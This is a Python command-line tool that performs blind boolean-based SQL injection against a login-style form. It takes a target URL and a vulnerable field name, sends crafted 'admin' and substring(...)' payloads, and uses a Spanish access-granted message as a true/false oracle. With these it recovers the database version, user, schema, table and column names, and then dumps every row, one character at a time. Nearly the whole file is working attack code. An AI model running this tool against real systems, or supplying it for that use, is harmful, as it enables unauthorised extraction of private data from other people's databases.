#! /usr/bin/env python
"""
This program uses recursion to find useful information from the backend database
"""

__author__="Aaron Castro"
__author_email__="aaron.castro.sanchez@outlook.com"
__copyright__="Aaron Castro"
__license__="MIT"

import requests, re, string, argparse, datetime

class bcolors:
    HEADER='\033[95m'
    BLUE='\033[94m'
    CYAN='\033[96m'
    GREEN='\033[92m'
    WARNING='\033[93m'
    FAIL='\033[91m'
    ENDC='\033[0m'
    BOLD='\033[1m'
    UNDERLINE='\033[4m'


req=requests.session()

def remove_html(html):
    clean=re.compile('<.*?>')
    return re.sub(clean, '', html)

def look_for_exitcode(html):
    if re.search('si tiene acceso', html):
        return(True)
    else:
        return(False)
        
def extract(key, query, init=''):
    for letter in string.ascii_lowercase + string.digits + string.punctuation:
        init=init[:-1] + letter
        init=init.strip()
        payload = {key: 'admin\' and substring(' + query + ',1,' + str(len(init)) + ')=\'' + init + '\'-- -'}
        print('Working... ' + datetime.datetime.now().time().strftime('%H:%M:%S'), end='\r')
        r=requests.post(url, data=payload)
        if look_for_exitcode(remove_html(r.text))==True:
            if init not in match:
                match.append(init)
            init=init + letter
            extract(key, query, init)
            break

parser=argparse.ArgumentParser()
parser.add_argument('-u', '--url', help='Base URL', type=str, required=True)
parser.add_argument('-k', '--key', help='Vulnerable input', type=str, required=True)
args=parser.parse_args()

if args.url:
    url=args.url.strip("\"")
if args.key:
    key=args.key

query='version()'
match=[]
extract(key, query)
print('')
if match:
    print('Database version ' + bcolors.BLUE + max(match, key=len) + bcolors.ENDC)
else:
    print(bcolors.FAIL + "Database version not found!" + bcolors.ENDC)

query='user()'
match=[]
extract(key, query)
print('')
if match:
    print('Database username ' + bcolors.BLUE + max(match, key=len) + bcolors.ENDC)
else:
    print("bcolors.FAIL + Database username not found!" + bcolors.ENDC)

query='database()'
match=[]
extract(key, query)
print('')
if match:
    print('Database name ' + bcolors.BLUE + max(match, key=len) + bcolors.ENDC)
    dbname=max(match, key=len)
    query='(select count(*) from information_schema.tables where table_schema="' + dbname + '")'
    match=[]
    extract(key, query)
    print('')
    if match:
        print('Number of tables in database ' + bcolors.BLUE + max(match, key=len) + bcolors.ENDC)
        for _ in range(0, int(max(match, key=len))):
            query='(select table_name from information_schema.tables where table_schema="' + dbname + '" limit ' + str(_) + ', 1)'
            match=[]
            extract(key, query)
            print('')
            if match:
                print('Table name ' + bcolors.BLUE + max(match, key=len) + bcolors.ENDC)
                tbname=max(match, key=len)
                query='(select count(column_name) from information_schema.columns where table_schema="' + dbname + '" and table_name="' + tbname + '")'
                match=[]
                extract(key, query)
                print('')
                tbinfo={}
                if match:
                    print('Number of columns in table ' + bcolors.CYAN + tbname + bcolors.ENDC + ' ' + bcolors.BLUE + max(match, key=len) + bcolors.ENDC)
                    for _ in range(0, int(max(match, key=len))):
                        query='(select column_name from information_schema.columns where table_name="' + tbname + '" and table_schema="' + dbname + '" limit ' + str(_) + ', 1)'
                        match=[]
                        extract(key, query)
                        print('')
                        if match:
                            print('Column name ' + bcolors.BLUE + max(match, key=len) + bcolors.ENDC)
                            tbinfo[max(match, key=len)] = list()
                        else:
                            print("bcolors.FAIL + No column name found!" + bcolors.ENDC)
                else:
                    print(bcolors.FAIL + "No columns found!" + bcolors.ENDC)
                query='(select count(*) from ' + tbname + ')'
                match=[]
                extract(key, query)
                print('')
                if match:
                    print('Number of rows in table ' + bcolors.CYAN + tbname + bcolors.ENDC + ' ' + bcolors.BLUE + max(match, key=len) + bcolors.ENDC)
                    for _ in range(0, int(max(match, key=len))):
                        for __ in tbinfo:
                            match=[]
                            query='(select ' + __ + ' from ' + tbname + ' limit ' + str(_) + ', 1)'
                            extract(key, query)
                            print('')
                            if match:
                                content=max(match, key=len)
                                tbinfo[__].append(content)
                            else:
                                print(bcolors.FAIL + "Row content not found!" + bcolors.ENDC)
                    for _ in zip(*([key] + (value) for key, value in tbinfo.items())):
                        print(''.join([str(__).ljust(20) for __ in _]))
                else:
                    print("bcolors.FAIL + No rows found!" + bcolors.ENDC)
            else:
                print("bcolors.FAIL + Table name not found!" + bcolors.ENDC)
    else:
        print("bcolors.FAIL + No tables found!" + bcolors.ENDC)
else:
    print("bcolors.FAIL + Database name not found!" + bcolors.ENDC)

if __name__=="__main__":
	args=parser.parse_args()